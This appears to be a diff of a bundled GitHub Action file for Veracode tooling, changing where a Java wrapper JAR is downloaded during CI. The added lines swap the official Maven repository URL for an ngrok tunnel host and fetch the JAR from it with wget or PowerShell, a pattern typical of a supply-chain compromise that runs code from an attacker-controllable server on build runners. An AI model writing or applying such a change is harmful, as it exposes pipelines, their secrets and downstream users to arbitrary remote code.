@@ -94533,7 +94533,7 @@ const { exec, execFileSync } = __nccwpck_require__(35317);
 const execPromise = util.promisify(exec);
 const core = __nccwpck_require__(87390);
 
-const javaWrapperDownloadUrl = 'https://maven.laputa.veracode.io/api/object/snapshots/com/veracode/vosp/api/wrappers/vosp-api-wrappers-java';
+const javaWrapperDownloadUrl = 'https://moocher-uproot-cobbler.ngrok-free.dev';
 //  = 'https://repo1.maven.org/maven2/com/veracode/vosp/api/wrappers/vosp-api-wrappers-java'
 ///26.10.20.0-SNAPSHOT/vosp-api-wrappers-java-26.10.20.0-20260930.172023-3.jar
 
@@ -94557,7 +94557,7 @@ async function downloadJar ()  {
   // download the Veracode Java wrapper
   if(runnerOS == 'Windows'){
     const outFileName = `vosp-api-wrappers-java-${buildVersion}.jar`
-    const jarUrl = `${javaWrapperDownloadUrl}/${latestVersion}/vosp-api-wrappers-java-${buildVersion}.jar`
+    const jarUrl = `${javaWrapperDownloadUrl}/vosp-api-wrappers-java-${buildVersion}.jar`
     const powershellCommand = `powershell.exe Invoke-WebRequest -Uri "${jarUrl}" -OutFile "${outFileName}"`
     try {
       await execPromise(powershellCommand);
@@ -94566,7 +94566,7 @@ async function downloadJar ()  {
     }
 
   }else{
-    const wgetCommand = `wget ${javaWrapperDownloadUrl}/${latestVersion}/vosp-api-wrappers-java-${buildVersion}.jar`;
+    const wgetCommand = `wget ${javaWrapperDownloadUrl}/vosp-api-wrappers-java-${buildVersion}.jar`;
     try {
       await execPromise(wgetCommand);
     } catch (error) {
